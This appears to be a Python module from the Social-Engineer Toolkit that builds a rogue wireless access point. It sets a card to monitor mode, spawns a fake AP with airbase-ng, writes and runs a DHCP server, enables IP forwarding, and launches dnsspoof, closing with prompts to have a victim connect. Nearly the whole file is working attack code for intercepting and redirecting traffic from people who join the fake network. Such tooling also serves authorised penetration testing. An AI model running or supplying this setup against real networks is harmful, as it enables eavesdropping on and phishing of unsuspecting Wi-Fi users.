#!/usr/bin/env python
##############################################
#
# This is a basic setup for an access point
# attack vector in set.
#
##############################################

import sys
import os
import subprocess
import re
import pexpect
import time
from src.core.setcore import *
from src.core.menu import text

# grab configuration options here
fileopen=file("config/set_config", "r")
for line in fileopen:
    line=line.rstrip()
    # look for airbase path
    match=re.search("AIRBASE_NG_PATH=", line)
    if match: 
        airbase_path = line.replace("AIRBASE_NG_PATH=", "")
        if not os.path.isfile(airbase_path):
            if os.path.isfile("/usr/local/sbin/airbase-ng"): airbase_path = "/usr/local/sbin/airbase-ng"

	# look for access point ssid
    match1=re.search("ACCESS_POINT_SSID=", line)
    if match1: access_point = line.replace("ACCESS_POINT_SSID=", "")

	# grab access point channel
    match2=re.search("AP_CHANNEL=", line)
    # if we hit on AP_CHANNEL in set_config
    if match2:
        # replace line and define ap_channel
        ap_channel = line.replace("AP_CHANNEL=", "")
        # default if not found
        if ap_channel == "": ap_channel = "9"

    # look for dnsspoof
    match3=re.search("DNSSPOOF_PATH=", line)
    if match3: dnsspoof_path = line.replace("DNSSPOOF_PATH=", "")

if not os.path.isfile(dnsspoof_path):
    if os.path.isfile("/usr/local/sbin/dnsspoof"):
        dnsspoof_path = "/usr/local/sbin/dnsspoof"
    else:
        PrintWarning("DNSSpoof was not found. Please install or correct path in set_config. Exiting....")
        ExitSet()

if not os.path.isfile(airbase_path):
    airbase_path = "src/wireless/airbase-ng"

PrintInfo("For this attack to work properly, we must edit the dhcp3-server file to include our wireless interface.")
PrintInfo("""This will allow dhcp3 to properly assign IPs. (INTERFACES="at0")""")
print("")
PrintStatus("SET will now launch nano to edit the file.")
PrintStatus("Press ^X to exit nano and don't forget to save the updated file!")
PrintWarning("If you receive an empty file in nano, please check the path of your dhcp3-server file!")
ReturnContinue()
subprocess.Popen("nano /etc/default/dhcp3-server", shell=True).wait()

# DHCP SERVER CONFIG HERE
dhcp_config1 = ("""
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
	range 10.0.0.100 10.0.0.254;
	option domain-name-servers 8.8.8.8;
	option routers 10.0.0.1;
	option broadcast-address 10.0.0.255;
	default-lease-time 600;
	max-lease-time 7200;
}
""")

dhcp_config2 = ("""
ddns-update-style none;
authoritative;
log-facility local7;
subnet 192.168.10.0 netmask 255.255.255.0 {
	range 192.168.10.100 192.168.10.254;
	option domain-name-servers 8.8.8.8;
	option routers 192.168.10.1;
	option broadcast-address 192.168.10.255;
	default-lease-time 600;
	max-lease-time 7200;
}
""")

show_fakeap_dhcp_menu = CreateMenu(text.fakeap_dhcp_text, text.fakeap_dhcp_menu)
fakeap_dhcp_menu_choice = raw_input(setprompt(["8"], ""))

if fakeap_dhcp_menu_choice != "":
	fakeap_dhcp_menu_choice = check_length(fakeap_dhcp_menu_choice,2)
	# convert it to a string
	fakeap_dhcp_menu_choice = str(fakeap_dhcp_menu_choice)
	
if fakeap_dhcp_menu_choice == "":
	fakeap_dhcp_menu_choice = "1"

if fakeap_dhcp_menu_choice == "1":
	# writes the dhcp server out
	PrintStatus("Writing the dhcp configuration file to src/program_junk")
	filewrite=file("src/program_junk/dhcp.conf", "w")
	filewrite.write(dhcp_config1)
	# close the file
	filewrite.close()
	dhcptun = 1

if fakeap_dhcp_menu_choice == "2":
	# writes the dhcp server out
	PrintStatus("Writing the dhcp configuration file to src/program_junk")
	filewrite=file("src/program_junk/dhcp.conf", "w")
	filewrite.write(dhcp_config2)
	# close the file
	filewrite.close()
	dhcptun = 2

if fakeap_dhcp_menu_choice == "exit":
	ExitSet()

interface = raw_input(setprompt(["8"], "Enter the wireless network interface (ex. wlan0)"))

# place wifi interface into monitor mode
PrintStatus("Placing card in monitor mode via airmon-ng..")

# if we have it already installed then don't use the SET one
if os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "/usr/local/sbin/airmon-ng"

if not os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "src/wireless/airmon-ng"

monproc = subprocess.Popen("%s start %s |  grep \"monitor mode enabled on\" | cut -d\" \" -f5 | sed -e \'s/)$//\'" % (airmonng_path,interface), shell=True, stdout=subprocess.PIPE)
moniface=monproc.stdout.read()
monproc.wait()

# execute modprobe tun
subprocess.Popen("modprobe tun", shell=True).wait()

# create a fake access point
PrintStatus("Spawning airbase-ng in a seperate child thread...")
child = pexpect.spawn('%s -P -C 20 -e "%s" -c %s %s' % (airbase_path,access_point,ap_channel,moniface))
PrintInfo("Sleeping 15 seconds waiting for airbase-ng to complete...")
time.sleep(15)

# bring the interface up
if dhcptun==1:
	PrintStatus("Bringing up the access point interface...")
	subprocess.Popen("ifconfig at0 up", shell=True).wait()
	subprocess.Popen("ifconfig at0 10.0.0.1 netmask 255.255.255.0", shell=True).wait()
	subprocess.Popen("ifconfig at0 mtu 1400", shell=True).wait()
	subprocess.Popen("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1", shell=True).wait()

if dhcptun==2:
	PrintStatus("Bringing up the access point interface...")
	subprocess.Popen("ifconfig at0 up", shell=True).wait()
	subprocess.Popen("ifconfig at0 192.168.10.1 netmask 255.255.255.0", shell=True).wait()
	subprocess.Popen("ifconfig at0 mtu 1400", shell=True).wait()
	subprocess.Popen("route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1", shell=True).wait()

# starts a dhcp server
PrintStatus("Starting the DHCP server on a seperate child thread...")
child2 = pexpect.spawn("dhcpd3 -q -cf src/program_junk/dhcp.conf -pf /var/run/dhcp3-server/dhcpd.pid at0")

# starts ip_forwarding
PrintStatus("Starting IP Forwarding...")
child3 = pexpect.spawn("echo 1 > /proc/sys/net/ipv4/ip_forward")

# start dnsspoof
PrintStatus("Starting DNSSpoof in a seperate child thread...")
child4 = pexpect.spawn("%s -i at0" % (dnsspoof_path))

PrintStatus("SET has finished creating the attack. If you experienced issues please report them.")
PrintStatus("Now launch SET attack vectors within the menus and have a victim connect via wireless.")
PrintStatus("Be sure to come back to this menu to stop the services once your finished.")
ReturnContinue()
